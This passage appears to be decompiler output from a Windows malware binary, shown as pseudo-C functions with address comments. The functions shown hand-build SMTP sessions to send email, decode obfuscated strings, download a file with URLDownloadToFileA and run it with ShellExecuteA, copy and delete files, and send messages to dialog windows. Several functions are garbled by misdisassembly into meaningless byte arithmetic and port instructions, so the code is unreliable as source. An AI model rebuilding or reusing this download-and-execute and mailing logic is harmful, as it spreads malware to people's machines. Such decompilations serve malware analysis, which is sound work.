        v35 = (int32_t *)v34;
        *v35 = *(int32_t *)(v1 - 32);
        function_40358a((int32_t)&g118);
        v36 = *v6 - 1;
        *v6 = v36;
        v7++;
    }
    // 0x4055df
    __writefsdword(0, *v35);
    *v33 = 0x405601;
    return function_403396();
}

// Address range: 0x4055fa - 0x4055ff
int32_t function_4055fa(void) {
    // 0x4055fa
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4055ff - 0x405601
int32_t function_4055ff(void) {
    // 0x4055ff
    int32_t result; // 0x4055ff
    return result;
}

// Address range: 0x405601 - 0x405607
int32_t function_405601(int32_t a1, int32_t a2) {
    // 0x405601
    int32_t result; // 0x405601
    return result;
}

// Address range: 0x40560a - 0x405663
int32_t function_40560a(void) {
    struct hostent * v1 = gethostbyname((char *)function_4036ca()); // 0x405618
    function_402722();
    int32_t result; // 0x40560a
    if (v1 != NULL) {
        int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x405638
        result = (int32_t)*(char *)v2;
    }
    // 0x405655
    return result;
}

// Address range: 0x405666 - 0x40570a
int32_t function_405666(void) {
    // 0x405666
    function_4036ba();
    int32_t v1 = __readfsdword(0); // bp-452, 0x40568a
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-412, 0x405666
    WSAStartup((int16_t)(int32_t)&v2, (struct WSAData *)257);
    int32_t v3 = 2; // bp-472, 0x4056a7
    int32_t sock_fd = socket(AF_UNSPEC, SOCK_STREAM, IPPROTO_IGMP); // 0x4056a9
    int32_t v4 = &v3; // 0x4056b3
    if (sock_fd != -1) {
        int16_t sock = htons((int16_t)function_40560a()); // 0x4056cd
        int32_t v5 = sock_fd; // bp-488, 0x4056e2
        int32_t v6 = &v5; // 0x4056e2
        int32_t v7 = connect((int32_t)sock, (struct sockaddr *)&g118, (int32_t)&g118); // 0x4056e3
        v4 = v6;
        if (v7 == 0) {
            // 0x4056ec
            int32_t v8; // 0x405666
            *(int32_t *)v8 = sock_fd;
            v4 = v6;
        }
    }
    // 0x4056f4
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x405711;
    return function_403372();
}

// Address range: 0x40570a - 0x40570f
int32_t function_40570a(void) {
    // 0x40570a
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40570f - 0x405711
int32_t function_40570f(void) {
    // 0x40570f
    int32_t result; // 0x40570f
    return result;
}

// Address range: 0x405711 - 0x40571a
int32_t function_405711(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405711
    int32_t result; // 0x405711
    return result;
}

// Address range: 0x40571a - 0x405726
int32_t function_40571a(void) {
    // 0x40571a
    int32_t v1; // 0x40571a
    closesocket(v1);
    return WSACleanup();
}

// Address range: 0x405726 - 0x405797
int32_t function_405726(void) {
    // 0x405726
    function_4036ba();
    int32_t v1 = __readfsdword(0); // bp-4124, 0x405749
    __writefsdword(0, (int32_t)&v1);
    function_4036ca();
    function_406ffa();
    int32_t sock = function_406fce(4); // 0x40576c
    int32_t buf; // bp-4105, 0x405726
    int32_t length; // 0x405726
    send(sock, (char *)&buf, length, (int32_t)&g118);
    __writefsdword(0, length);
    return function_403372();
}

// Address range: 0x405797 - 0x40579c
int32_t function_405797(void) {
    // 0x405797
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40579c - 0x40579e
int32_t function_40579c(void) {
    // 0x40579c
    int32_t result; // 0x40579c
    return result;
}

// Address range: 0x40579e - 0x4057a5
int32_t function_40579e(int32_t a1) {
    // 0x40579e
    int32_t result; // 0x40579e
    return result;
}

// Address range: 0x4057a6 - 0x4057d2
int32_t function_4057a6(void) {
    // 0x4057a6
    int32_t sock; // 0x4057a6
    recv(sock, (char *)&g118, (int32_t)&g118, (int32_t)&g118);
    return function_406fe6();
}

// Address range: 0x4057d2 - 0x405a47
int32_t function_4057d2(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1; // bp-8, 0x4057d2
    int32_t v2 = &v1; // 0x4057d6
    int32_t v3; // 0x4057d2
    for (int32_t i = 8; i > 0; i--) {
        // 0x4057db
        v3 = v2;
        *(int32_t *)(v3 - 4) = 0;
        v2 = v3 - 8;
        *(int32_t *)v2 = 0;
    }
    // 0x4057e2
    *(int32_t *)(v3 - 12) = 0;
    function_4036ba();
    function_4036ba();
    function_4036ba();
    function_4036ba();
    function_4036ba();
    function_4036ba();
    function_4036ba();
    int32_t v4; // bp-4, 0x4057d2
    *(int32_t *)(v3 - 20) = (int32_t)&v4;
    *(int32_t *)(v3 - 24) = 0x405a47;
    int32_t v5 = __readfsdword(0); // 0x405830
    int32_t v6 = v3 - 28; // 0x405830
    int32_t * v7 = (int32_t *)v6;
    *v7 = v5;
    __writefsdword(0, v6);
    int32_t * v8 = v7; // 0x40584a
    int32_t v9 = v6; // 0x40584a
    if (function_405666() != 0) {
        // 0x405850
        *(int32_t *)(v3 - 32) = (int32_t)"HELO ";
        *(int32_t *)(v3 - 40) = (int32_t)"\r\n";
        function_40358a((int32_t)&g118);
        function_405726();
        function_4057a6();
        function_405726();
        function_4057a6();
        function_4034d2();
        function_405726();
        function_4057a6();
        function_4034d2();
        function_405726();
        function_4057a6();
        *(int32_t *)(v3 - 44) = (int32_t)"MAIL FROM: <";
        *(int32_t *)(v3 - 48) = a1;
        *(int32_t *)(v3 - 52) = (int32_t)&g2;
        *(int32_t *)(v3 - 56) = (int32_t)"\r\n";
        function_40358a((int32_t)&g118);
        function_405726();
        function_4057a6();
        *(int32_t *)(v3 - 60) = (int32_t)"RCPT TO: <";
        *(int32_t *)(v3 - 64) = a2;
        *(int32_t *)(v3 - 68) = (int32_t)&g2;
        *(int32_t *)(v3 - 72) = (int32_t)"\r\n";
        function_40358a((int32_t)&g118);
        function_405726();
        function_4057a6();
        function_405726();
        function_4057a6();
        *(int32_t *)(v3 - 76) = (int32_t)"From: <";
        *(int32_t *)(v3 - 80) = a1;
        *(int32_t *)(v3 - 84) = (int32_t)&g2;
        *(int32_t *)(v3 - 88) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 92) = (int32_t)"To: <";
        *(int32_t *)(v3 - 96) = a2;
        *(int32_t *)(v3 - 100) = (int32_t)&g2;
        *(int32_t *)(v3 - 104) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 108) = (int32_t)"Subject: ";
        *(int32_t *)(v3 - 112) = a3;
        *(int32_t *)(v3 - 116) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 120) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 124) = a4;
        *(int32_t *)(v3 - 128) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 132) = (int32_t)&g3;
        v9 = v3 - 136;
        v8 = (int32_t *)v9;
        *v8 = (int32_t)"\r\n";
        function_40358a((int32_t)&g118);
        function_405726();
        function_4057a6();
        function_405726();
        function_4057a6();
        function_40571a();
    }
    // 0x405a12
    __writefsdword(0, *v8);
    *(int32_t *)(v9 + 8) = 0x405a4e;
    function_403396();
    function_403396();
    return function_403396();
}

// Address range: 0x405a47 - 0x405a4c
int32_t function_405a47(void) {
    // 0x405a47
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405a4c - 0x405a4e
int32_t function_405a4c(void) {
    // 0x405a4c
    int32_t result; // 0x405a4c
    return result;
}

// Address range: 0x405a4e - 0x405a57
int32_t function_405a4e(int32_t a1) {
    // 0x405a4e
    int32_t result; // 0x405a4e
    return result;
}

// Address range: 0x405b19 - 0x405b61
int32_t function_405b19(void) {
    // 0x405b19
    int32_t v1; // 0x405b19
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x405b19
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x405b19
    char * v5 = (char *)(v4 + 85); // 0x405b1d
    int32_t v6; // 0x405b19
    *v5 = *v5 + (char)v6;
    int32_t v7 = __readfsdword(0); // bp-16, 0x405b31
    __writefsdword(0, (int32_t)&v7);
    int32_t v8 = g103 + 1; // 0x405b37
    g103 = v8;
    if (v8 == 0) {
        // 0x405b3f
        function_403372();
        function_403372();
    }
    // 0x405b53
    __writefsdword(0, v7);
    return 0;
}

// Address range: 0x405b61 - 0x405b66
int32_t function_405b61(void) {
    // 0x405b61
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405b66 - 0x405b68
int32_t function_405b66(void) {
    // 0x405b66
    int32_t result; // 0x405b66
    return result;
}

// Address range: 0x405b68 - 0x405b6a
int32_t function_405b68(int32_t a1) {
    // 0x405b68
    int32_t result; // 0x405b68
    return result;
}

// Address range: 0x405b6a - 0x405b72
int32_t function_405b6a(void) {
    // 0x405b6a
    g103--;
    int32_t result; // 0x405b6a
    return result;
}

// Address range: 0x405b72 - 0x405c87
int32_t function_405b72(void) {
    // 0x405b72
    int32_t v1; // 0x405b72
    if (v1 == 0) {
        // 0x405c7c
        int32_t v2; // bp-24, 0x405b72
        return *(int32_t *)((int32_t)&v2 + 4);
    }
    char * v3 = (char *)function_4036ca(); // 0x405b93
    char * lpszWindow = v3; // bp-28, 0x405b93
    if (!PathFileExistsA(v3)) {
        // 0x405c7c
        return *(int32_t *)((int32_t)&lpszWindow + 4);
    }
    int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"#32770", NULL, lpszWindow); // 0x405bb5
    int32_t lParam = (int32_t)hWnd; // 0x405bb5
    int32_t v4 = lParam; // bp-48, 0x405bbc
    if (!IsWindow(hWnd)) {
        // 0x405c7c
        return *(int32_t *)((int32_t)&v4 + 4);
    }
    int32_t v5 = 66; // bp-56, 0x405bde
    int32_t * hMem = GlobalAlloc(function_4034ca() + 22, 66); // 0x405be0
    if (hMem == NULL) {
        // 0x405c7c
        return *(int32_t *)((int32_t)&v5 + 4);
    }
    int32_t * v6 = GlobalLock(hMem); // 0x405bf0
    char * v7; // bp-64, 0x405b72
    if (v6 == NULL) {
        // 0x405bfb
        v7 = (char *)hMem;
        GlobalFree(hMem);
        // 0x405c7c
        return *(int32_t *)((int32_t)&v7 + 4);
    }
    int32_t v8 = (int32_t)v6; // 0x405bf0
    *v6 = 20;
    *(int32_t *)(v8 + 4) = 0;
    *(int32_t *)(v8 + 8) = 0;
    *(int32_t *)(v8 + 12) = 0;
    *(int32_t *)(v8 + 16) = 0;
    char * lpString1 = (char *)function_4036ca(); // 0x405c24
    v7 = lpString1;
    lstrcpyA(lpString1, (char *)(v8 + 20));
    GlobalUnlock(hMem);
    PostMessageA(NULL, (int32_t)hMem, 563, lParam);
    int32_t hWnd2 = function_406f2e(0x405c92, 2000, -1); // 0x405c5c
    int32_t v9 = hWnd2; // bp-104, 0x405c63
    bool v10 = IsWindow((int32_t *)hWnd2); // 0x405c64
    int32_t v11 = &v9; // 0x405c6b
    if (v10) {
        int32_t v12 = hWnd2; // bp-120, 0x405c76
        SendMessageA(NULL, 0, 245, hWnd2);
        v11 = &v12;
    }
    // 0x405c7c
    return *(int32_t *)(v11 + 4);
}

// Address range: 0x405c87 - 0x405d82
int32_t function_405c87(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x405c87
    uint32_t v1; // 0x405c87
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405c87
    *(char *)v2 = *(char *)&v2 + (char)(v1 / 256);
    int32_t v3 = (v1 & 14) > 9 ? v1 + 6 : v1; // 0x405c8d
    bool v4 = (v1 & 14) > 9 | (v3 & 14) > 9; // 0x405c8e
    int32_t v5 = (v4 ? v3 + 6 : v3) & 15; // 0x405c8e
    int32_t v6 = v5 | v1 & -0x10000 | 256 * ((int32_t)v4 + (int32_t)((v1 & 14) > 9)) + v1 & 0xff00; // 0x405c8e
    char * v7 = (char *)v6; // 0x405c8f
    char v8 = v5; // 0x405c8f
    *v7 = *v7 ^ v8;
    int32_t v9; // 0x405c87
    char * v10 = (char *)(v9 + 0x4e2628f1); // 0x405c91
    uint32_t v11; // 0x405c87
    *v10 = *v10 + (char)(v11 / 256);
    int32_t * v12 = (int32_t *)v6; // 0x405c97
    *v12 = *v12 - v6;
    char * v13 = (char *)(v11 + 117); // 0x405c99
    char v14 = *v13 + v8; // 0x405c99
    *v13 = v14;
    if (v14 == 0) {
        int32_t v15 = function_403c92(); // 0x405d17
        v2 = v15;
        int32_t result; // 0x405c87
        if (v15 < 0) {
            // 0x405d3a
            function_403c8a();
            function_403e46();
            function_403c92();
            function_4033c6();
            result = -1;
        } else {
            // 0x405d22
            v2 = v15 + 1;
            function_403616();
        }
        // 0x405d7b
        return result;
    }
    // 0x405c9e
    int32_t v16; // 0x405c87
    int32_t v17 = v11 ^ v16; // 0x405c8b
    int16_t v18 = v11; // 0x405c9e
    __asm_outsd(v18, *(int32_t *)v17);
    __asm_outsb(v18, *(char *)v17);
    *v7 = *v7 + v8;
    __asm_iretd();
    int32_t v19; // 0x405c87
    char * v20 = (char *)(v19 - 117); // 0x405cad
    *v20 = *v20 - 69;
    __asm_in(-0x2b45);
    int32_t v21 = __readfsdword(0); // bp-12, 0x405cb9
    __writefsdword(0, (int32_t)&v21);
    g104++;
    __writefsdword(0, v21);
    return 0;
}

// Address range: 0x405d82 - 0x405db9
int32_t function_405d82(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405d8d
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g105 + 1; // 0x405d93
    g105 = v2;
    if (v2 == 0) {
        // 0x405d9b
        function_403e52();
    }
    // 0x405dab
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405db9 - 0x405dbe
int32_t function_405db9(void) {
    // 0x405db9
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405dbe - 0x405dc0
int32_t function_405dbe(void) {
    // 0x405dbe
    int32_t result; // 0x405dbe
    return result;
}

// Address range: 0x405dc0 - 0x405dc2
int32_t function_405dc0(int32_t a1) {
    // 0x405dc0
    int32_t result; // 0x405dc0
    return result;
}

// Address range: 0x405dc2 - 0x405e04
int32_t function_405dc2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405dcd
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g105; // 0x405dd3
    g105 = v2 - 1;
    if (v2 == 0) {
        // 0x405ddc
        function_403e46();
    }
    // 0x405df6
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405e04 - 0x405e09
int32_t function_405e04(void) {
    // 0x405e04
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405e09 - 0x405e0b
int32_t function_405e09(void) {
    // 0x405e09
    int32_t result; // 0x405e09
    return result;
}

// Address range: 0x405e0b - 0x405e0d
int32_t function_405e0b(int32_t a1) {
    // 0x405e0b
    int32_t result; // 0x405e0b
    return result;
}

// Address range: 0x405e0e - 0x405e0f
int32_t function_405e0e(void) {
    // 0x405e0e
    int32_t result; // 0x405e0e
    return result;
}

// Address range: 0x405e10 - 0x405f51
int32_t function_405e10(int32_t a1) {
    // 0x405e10
    int32_t v1; // 0x405e10
    int32_t v2 = v1;
    *(char *)v2 = *(char *)&v1 + (char)v2;
    int32_t v3 = v1;
    *(char *)v3 = *(char *)&v1 + (char)v3;
    int32_t v4 = v1;
    *(char *)v4 = *(char *)&v1 + (char)v4;
    int32_t v5 = v1;
    *(char *)v5 = *(char *)&v1 + (char)v5;
    int32_t v6 = v1;
    *(char *)v6 = *(char *)&v1 + (char)v6;
    int32_t v7 = v1;
    *(char *)v7 = *(char *)&v1 + (char)v7;
    int32_t v8 = v1;
    *(char *)v8 = *(char *)&v1 + (char)v8;
    int32_t v9 = v1;
    *(char *)v9 = *(char *)&v1 + (char)v9;
    int32_t v10 = v1;
    *(char *)v10 = *(char *)&v1 + (char)v10;
    int32_t v11 = v1;
    *(char *)v11 = *(char *)&v1 + (char)v11;
    int32_t v12 = v1;
    *(char *)v12 = *(char *)&v1 + (char)v12;
    int32_t v13 = v1;
    *(char *)v13 = *(char *)&v1 + (char)v13;
    int32_t v14 = v1;
    *(char *)v14 = *(char *)&v1 + (char)v14;
    int32_t v15 = v1;
    *(char *)v15 = *(char *)&v1 + (char)v15;
    int32_t v16 = v1;
    *(char *)v16 = *(char *)&v1 + (char)v16;
    int32_t v17 = v1;
    *(char *)v17 = *(char *)&v1 + (char)v17;
    int32_t v18 = v1;
    *(char *)v18 = *(char *)&v1 + (char)v18;
    int32_t v19 = v1;
    *(char *)v19 = *(char *)&v1 + (char)v19;
    int32_t v20 = v1;
    *(char *)v20 = *(char *)&v1 + (char)v20;
    int32_t v21 = v1;
    *(char *)v21 = *(char *)&v1 + (char)v21;
    int32_t v22 = v1;
    *(char *)v22 = *(char *)&v1 + (char)v22;
    int32_t v23 = v1;
    *(char *)v23 = *(char *)&v1 + (char)v23;
    int32_t v24 = v1;
    *(char *)v24 = *(char *)&v1 + (char)v24;
    int32_t v25 = v1;
    *(char *)v25 = *(char *)&v1 + (char)v25;
    int32_t v26 = v1;
    *(char *)v26 = *(char *)&v1 + (char)v26;
    int32_t v27 = v1;
    *(char *)v27 = *(char *)&v1 + (char)v27;
    int32_t v28 = v1;
    *(char *)v28 = *(char *)&v1 + (char)v28;
    int32_t v29 = v1;
    *(char *)v29 = *(char *)&v1 + (char)v29;
    int32_t v30 = v1;
    *(char *)v30 = *(char *)&v1 + (char)v30;
    int32_t v31 = v1;
    *(char *)v31 = *(char *)&v1 + (char)v31;
    int32_t v32 = 0; // bp-16, 0x405e59
    int32_t v33 = __readfsdword(0); // bp-48, 0x405e6a
    __writefsdword(0, (int32_t)&v33);
    int32_t v34 = a1; // bp-56, 0x405e79
    int32_t v35 = &v34; // 0x405e79
    int32_t v36 = GetClassLongA((int32_t *)-1, (int32_t)&g118); // 0x405e7a
    int32_t v37 = v35; // 0x405e84
    if (v36 == 0x8002) {
        // 0x405e8a
        function_407022();
        int32_t v38 = function_40380e(); // 0x405e9c
        int32_t v39 = function_40380e() - 1; // 0x405eb5
        v37 = v35;
        if (v39 >= 0 && v38 + 2 <= v39) {
            int32_t v40 = &v32; // bp-60, 0x405ec1
            function_40372a(&v32);
            v37 = &v40;
            if (v32 != 0) {
                // 0x405ee6
                function_406e0a();
                function_403476();
                function_4034d2();
                DeleteFileA((char *)function_4036ca());
                char * lpExistingFileName = (char *)function_4036ca(); // 0x405f26
                char * v41 = lpExistingFileName; // bp-76, 0x405f26
                CopyFileA(lpExistingFileName, (char *)&g118, (bool)&g118);
                function_405b72();
                v37 = (int32_t)&v41;
            }
        }
    }
    // 0x405f36
    __writefsdword(0, *(int32_t *)v37);
    *(int32_t *)(v37 + 8) = 0x405f58;
    return function_403396();
}

// Address range: 0x405f51 - 0x405f56
int32_t function_405f51(void) {
    // 0x405f51
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405f56 - 0x405f58
int32_t function_405f56(void) {
    // 0x405f56
    int32_t result; // 0x405f56
    return result;
}

// Address range: 0x405f58 - 0x405f64
int32_t function_405f58(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405f58
    int32_t v1; // 0x405f58
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x405f69 - 0x405f73
int32_t function_405f69(void) {
    // 0x405f69
    int32_t v1; // 0x405f69
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x405f69
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    return result;
}

// Address range: 0x405f78 - 0x405f8f
int32_t function_405f78(void) {
    // 0x405f78
    int32_t v1; // 0x405f78
    *(char *)v1 = 2 * (char)v1;
    uint32_t v2; // 0x405f78
    int32_t v3 = (v2 & 0x100000) == 0 ? 0 : 255; // 0x405f7e
    int32_t v4; // 0x405f78
    char * v5 = (char *)((v1 | (int32_t)__asm_in((int16_t)v4)) & -256 | v3); // 0x405f7f
    unsigned char v6 = *v5; // 0x405f7f
    *v5 = v6 / 128 | 2 * v6;
    uint32_t v7; // 0x405f78
    *(char *)v4 = *(char *)&v4 + (char)(v7 / 256);
    *(int32_t *)((v2 / 0x100000 | 0x1000 * v2) - 4) = 0x405e52;
    return EnumWindows((bool (*)(int32_t *, int32_t))&g118, (int32_t)&g118);
}

// Address range: 0x405f82 - 0x405f83
int32_t function_405f82(int32_t a1) {
    // 0x405f82
    int32_t result; // 0x405f82
    return result;
}

// Address range: 0x405f92 - 0x405fb7
int32_t function_405f92(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405f9d
    __writefsdword(0, (int32_t)&v1);
    g106++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405fb7 - 0x405fbc
int32_t function_405fb7(void) {
    // 0x405fb7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405fbc - 0x405fbe
int32_t function_405fbc(void) {
    // 0x405fbc
    int32_t result; // 0x405fbc
    return result;
}

// Address range: 0x405fbe - 0x405fc0
int32_t function_405fbe(int32_t a1) {
    // 0x405fbe
    int32_t result; // 0x405fbe
    return result;
}

// Address range: 0x405fc2 - 0x405fca
int32_t function_405fc2(void) {
    // 0x405fc2
    g106--;
    int32_t result; // 0x405fc2
    return result;
}

// Address range: 0x405fca - 0x406002
int32_t function_405fca(void) {
    // 0x405fca
    function_40603e();
    if (g33 == 0) {
        // 0x405ffe
        return 0;
    }
    int32_t result = *(int32_t *)0x408154; // 0x405fdc
    if (*(int32_t *)result == 0) {
        // 0x405ffe
        return result;
    }
    // 0x405fe6
    PostQuitMessage(66);
    function_4043d6(66);
    // UNREACHABLE
}

// Address range: 0x406005 - 0x40603c
int32_t function_406005(void) {
    // 0x406005
    uint32_t v1; // 0x406005
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x406005
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    char * v4 = (char *)(v1 + 114); // 0x406009
    *v4 = *v4 + (char)(v1 / 256);
    int32_t v5 = v2;
    *(char *)v5 = *(char *)&v2 + (char)v5;
    if (g29 != 0) {
        // 0x406017
        function_40603e();
    }
    int32_t v6 = *(int32_t *)0x408148; // 0x406021
    int32_t timerId = SetTimer((int32_t *)0x405fca, 1000 * *(int32_t *)v6, 0, NULL); // 0x406031
    g29 = timerId;
    return timerId;
}

// Address range: 0x40603e - 0x40605c
int32_t function_40603e(void) {
    // 0x40603e
    int32_t result; // 0x40603e
    if (g29 != 0) {
        // 0x406047
        KillTimer((int32_t *)g29, 0);
        g29 = 0;
        result = 0;
    }
    // 0x40605b
    return result;
}

// Address range: 0x40605e - 0x40606a
int32_t function_40605e(void) {
    // 0x40605e
    int32_t v1; // 0x40605e
    return function_405f82(v1);
}

// Address range: 0x40606a - 0x406091
int32_t function_40606a(void) {
    // 0x40606a
    if (g30 != 0) {
        // 0x406073
        function_406092();
    }
    int32_t timerId = SetTimer((int32_t *)0x40605e, 0x1492, 0, NULL); // 0x406086
    g30 = timerId;
    return timerId;
}

// Address range: 0x406092 - 0x4060b0
int32_t function_406092(void) {
    // 0x406092
    int32_t result; // 0x406092
    if (g30 != 0) {
        // 0x40609b
        KillTimer((int32_t *)g30, 0);
        g30 = 0;
        result = 0;
    }
    // 0x4060af
    return result;
}

// Address range: 0x4060b2 - 0x4060d7
int32_t function_4060b2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4060bd
    __writefsdword(0, (int32_t)&v1);
    g107++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4060d7 - 0x4060dc
int32_t function_4060d7(void) {
    // 0x4060d7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4060dc - 0x4060de
int32_t function_4060dc(void) {
    // 0x4060dc
    int32_t result; // 0x4060dc
    return result;
}

// Address range: 0x4060de - 0x4060e0
int32_t function_4060de(int32_t a1) {
    // 0x4060de
    int32_t result; // 0x4060de
    return result;
}

// Address range: 0x4060e2 - 0x4060ea
int32_t function_4060e2(void) {
    // 0x4060e2
    g107--;
    int32_t result; // 0x4060e2
    return result;
}

// Address range: 0x4060ea - 0x4060f0
int32_t function_4060ea(void) {
    // 0x4060ea
    return URLDownloadToFileA2();
}

// Address range: 0x4060f2 - 0x40617e
int32_t function_4060f2(void) {
    // 0x4060f2
    function_4036ba();
    int32_t v1 = __readfsdword(0); // bp-32, 0x40610e
    __writefsdword(0, (int32_t)&v1);
    function_4034ca();
    function_403856();
    int32_t v2 = function_4034ca(); // 0x406128
    int32_t v3 = 1; // 0x406131
    int32_t v4 = v2; // 0x406131
    if (v2 < 1) {
        // 0x406168
        __writefsdword(0, v1);
        return function_403372();
    }
    int32_t v5 = v3 - 1;
    int32_t v6; // 0x4060f2
    char * v7 = (char *)(v5 + v6); // 0x40613b
    int32_t v8 = function_403722();
    if (*v7 != 61) {
        // 0x406150
        *(char *)(v8 + v5) = *v7 - 1;
    } else {
        // 0x406142
        *(char *)(v8 + v5) = 46;
    }
    // 0x406164
    v4--;
    v3++;
    while (v4 != 0) {
        // 0x406138
        v5 = v3 - 1;
        v7 = (char *)(v5 + v6);
        v8 = function_403722();
        if (*v7 != 61) {
            // 0x406150
            *(char *)(v8 + v5) = *v7 - 1;
        } else {
            // 0x406142
            *(char *)(v8 + v5) = 46;
        }
        // 0x406164
        v4--;
        v3++;
    }
    // 0x406168
    __writefsdword(0, v1);
    return function_403372();
}

// Address range: 0x40617e - 0x406183
int32_t function_40617e(void) {
    // 0x40617e
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406183 - 0x406185
int32_t function_406183(void) {
    // 0x406183
    int32_t result; // 0x406183
    return result;
}

// Address range: 0x406185 - 0x40618b
int32_t function_406185(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x406185
    int32_t result; // 0x406185
    return result;
}

// Address range: 0x40618e - 0x4061c4
int32_t function_40618e(void) {
    // 0x40618e
    int32_t v1; // 0x40618e
    int32_t v2; // 0x40618e
    function_4027a2(v2, v1);
    function_402696();
    return function_4034a6();
}

// Address range: 0x4061c6 - 0x40630d
int32_t function_4061c6(void) {
    // 0x4061c6
    int32_t v1; // bp-4, 0x4061c6
    int32_t v2 = &v1; // 0x4061c6
    int32_t v3 = v2; // 0x4061c9
    int32_t v4; // 0x4061c6
    for (int32_t i = 5; i > 0; i--) {
        // 0x4061ce
        v4 = v3;
        *(int32_t *)(v4 - 4) = 0;
        v3 = v4 - 8;
        *(int32_t *)v3 = 0;
    }
    // 0x4061d5
    *(int32_t *)(v4 - 12) = 0;
    *(int32_t *)(v4 - 20) = v2;
    *(int32_t *)(v4 - 24) = 0x40630d;
    int32_t v5 = __readfsdword(0); // 0x4061df
    int32_t v6 = v4 - 28; // 0x4061df
    *(int32_t *)v6 = v5;
    __writefsdword(0, v6);
    function_403476();
    function_4060f2();
    function_4036ca();
    function_403476();
    int32_t v7; // bp-12, 0x4061c6
    *(int32_t *)(v4 - 32) = (int32_t)&v7;
    function_40372a(&g118);
    function_40376a();
    int32_t v8; // bp-16, 0x4061c6
    *(int32_t *)(v4 - 36) = (int32_t)&v8;
    function_4034ca();
    function_40372a(&g118);
    *(int32_t *)(v4 - 40) = (int32_t)"Down(";
    function_40618e();
    *(int32_t *)(v4 - 48) = (int32_t)&g4;
    *(int32_t *)(v4 - 52) = v8;
    function_40358a((int32_t)&g118);
    *(int32_t *)(v4 - 56) = 0;
    *(int32_t *)(v4 - 60) = 0;
    function_403516();
    *(int32_t *)(v4 - 64) = function_4036ca();
    function_403476();
    function_4060f2();
    *(int32_t *)(v4 - 68) = function_4036ca();
    *(int32_t *)(v4 - 72) = 0;
    function_4060ea();
    *(int32_t *)(v4 - 76) = 1;
    *(int32_t *)(v4 - 80) = 0;
    *(int32_t *)(v4 - 84) = 0;
    function_403516();
    int32_t v9 = function_4036ca(); // 0x4062e0
    int32_t * v10 = (int32_t *)(v4 - 88); // 0x4062e5
    *v10 = v9;
    *(int32_t *)(v4 - 92) = (int32_t)"Open";
    int32_t * v11 = (int32_t *)(v4 - 96); // 0x4062eb
    *v11 = 0;
    ShellExecuteA(&g118, (char *)&g118, (char *)&g118, (char *)&g118, (char *)&g118, (int32_t)&g118);
    __writefsdword(0, *v11);
    *v10 = 0x406314;
    return function_403396();
}

// Address range: 0x40630d - 0x406312
int32_t function_40630d(void) {
    // 0x40630d
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406312 - 0x406314
int32_t function_406312(void) {
    // 0x406312
    int32_t result; // 0x406312
    return result;
}

// Address range: 0x406314 - 0x406319
int32_t function_406314(int32_t a1) {
    // 0x406314
    int32_t result; // 0x406314
    return result;
}

// Address range: 0x406339 - 0x4065ee
int32_t function_406339(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t v2; // 0x406339
    *(int32_t *)v2 = v2 + 1;
    int32_t v3; // 0x406339
    int32_t v4 = v3;
    *(char *)v4 = *(char *)&v3 + (char)v4;
    char * v5 = (char *)(v2 + 58); // 0x40633d
    *v5 = *v5 + (char)(v3 / 256);
    int32_t v6; // 0x406339
    char * v7 = (char *)(v6 + 112); // 0x406341
    int32_t v8; // 0x406339
    *v7 = *v7 + (char)v8;
    int32_t v9; // 0x406339
    int32_t v10; // 0x406339
    __asm_outsb((int16_t)v10, __readgsbyte(v9));
    int32_t v11 = v3;
    *(char *)v11 = *(char *)&v3 + (char)v11;
    int32_t v12 = v3;
    *(char *)v12 = *(char *)&v3 + (char)v12;
    int32_t v13 = &v1; // 0x40634a
    int32_t v14 = v13; // 0x40634d
    int32_t v15; // 0x406339
    for (int32_t i = 13; i > 0; i--) {
        // 0x406352
        v15 = v14;
        *(int32_t *)(v15 - 4) = 0;
        v14 = v15 - 8;
        *(int32_t *)v14 = 0;
    }
    // 0x406359
